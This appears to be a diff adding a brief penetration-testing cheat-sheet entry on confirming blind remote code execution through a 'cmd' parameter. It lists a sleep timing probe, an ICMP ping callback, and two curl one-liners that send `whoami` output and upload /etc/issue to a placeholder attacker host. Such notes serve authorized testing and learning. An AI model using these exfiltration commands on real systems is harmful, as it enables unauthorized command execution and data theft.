@@ -1,0 +1,5 @@
+Blind Remote Code Execution
+> ?cmd=sleep+1
+> capture icmp    // ping+<ip>+-c+5
+> curl http://<ip>:<port>/`whoami`
+> curl http://<ip>:<port>/file -T /etc/issue      // PUT File in HTTP to the attacker listener
